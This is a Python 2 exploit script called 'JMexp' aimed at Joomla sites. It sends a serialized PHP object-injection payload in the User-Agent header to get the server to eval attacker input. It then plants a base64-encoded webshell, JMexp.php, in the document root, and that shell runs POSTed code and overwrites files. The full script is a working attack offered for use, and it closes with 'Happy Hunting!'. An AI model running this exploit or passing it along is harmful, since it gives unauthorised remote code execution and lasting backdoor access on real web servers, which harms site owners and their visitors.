# !/usr/bin/python
# coding=utf-8
# thanks for nlfox
# fixed by evil7
# 2015/12/16

import urllib
import re
import os
__author__ = 'nlfox233'
import urllib2
import cookielib
import sys

site = sys.argv[1]

os.system('clear')
print "     _ __  __"
print "    | |  \/  | _____  ___ __"
print " _  | | |\/| |/ _ \ \/ / '_ \\"
print "| |_| | |  | |  __/>  <| |_) |"
print " \___/|_|  |_|\___/_/\_\ .__/"
print "                       |_|   v:2015.12.16"
print ""
print "  >> JMexp running..."

code = "file_put_contents($_SERVER['DOCUMENT_ROOT'].'/JMexp.php',base64_decode('PD9waHAgaGVhZGVyKCJjb250ZW50LVR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD11dGY4Iik7IGlmKGdldF9tYWdpY19xdW90ZXNfZ3BjKCkpIGZvcmVhY2goJF9QT1NUIGFzICRrPT4kdikgJF9QT1NUWyRrXSA9IHN0cmlwc2xhc2hlcygkdik7Pz48P3BocCBAZXZhbCgkX1BPU1RbJ0pNZXhwJ10pOz8+IA0KPGNlbnRlcj4NCklGIFVwZGF0ZSBXZWJzaGVsbCBOb3QgU3VlY2Nlc3MuPGJyPg0KWW91IENhbiBVcGxvYWQgRmlsZSBCeSBZb3VzZWxmLiA8YnI+DQpPciBVc2UgMUNvZGVTaGVsbCBXaXRoIFRoaXMgV2Vic2hlbGwuPGJyPg0KMUNvZGU6IEpNZXhwPGJyPjxicj4NCjxmb3JtIG1ldGhvZD0iUE9TVCI+DQo8aW5wdXQgdHlwZT0ic3VibWl0IiBuYW1lPSJzdWJtaXQiIHZhbHVlPSJTYXZlX2l0Ij46PGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImZpbGUiIHNpemU9IjYwIiB2YWx1ZT0iPD9waHAgZWNobyBfX0ZJTEVfXzs/PiI+IA0KPGJyPjxicj4gDQo8dGV4dGFyZWEgbmFtZT0idGV4dCIgQ09MUz0iNzAiIFJPV1M9IjE4Ij48L3RleHRhcmVhPiANCjxmb3JtPg0KPC9jZW50ZXI+DQo8P3BocCBpZihpc3NldCgkX1BPU1RbJ3RleHQnXSkpeyRmcCA9IEBmb3BlbigkX1BPU1RbJ2ZpbGUnXSwnd2InKTtlY2hvIEBmd3JpdGUoJGZwLCRfUE9TVFsndGV4dCddKSA/ICdTdWVjY2VzcycgOiAnRmFpbCc7QGZjbG9zZSgkZnApO30/Pg0KPD9waHAgaWYoaXNzZXQoJF9QT1NUWydKTWRhdGEnXSkpeyRmcCA9IEBmb3BlbiggX19GSUxFX18sJ3diJyk7ZWNobyBAZndyaXRlKCRmcCxiYXNlNjRfZGVjb2RlKCRfUE9TVFsnSk1kYXRhJ10pKSA/ICdTdWVjY2VzcycgOiAnRmFpbCc7QGZjbG9zZSgkZnApO30/Pg=='))"

url = site + '?1=' + urllib.quote("@ini_set(\"display_errors\",\"0\");@set_time_limit(0);@set_magic_quotes_runtime(0);echo '->|';" + code + ";echo '|<-';")
cj = cookielib.CookieJar()
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
urllib2.install_opener(opener)
urllib2.socket.setdefaulttimeout(10)

ua = '}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\x5C0\x5C0\x5C0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";s:46:"eval($_REQUEST[1]);JFactory::getConfig();exit;";s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\x5C0\x5C0\x5C0connection";b:1;}\xF0\x9D\x8C\x86'
req = urllib2.Request(url=url, headers={'User-Agent': ua})
opener.open(req)
req = urllib2.Request(url=url)
res = opener.open(req).read()

print ""
print "  >> All done ! Job Success !"
print ""
print "  >> Webshell at " + site + "/JMexp.php"
print ""
print "  >> Go on and Open webshell to use more! "
print ""
print "  >> If webshell not uploaded you can do it by youself."
print ""
print "  >> Happy Hunting! :P"
print ""
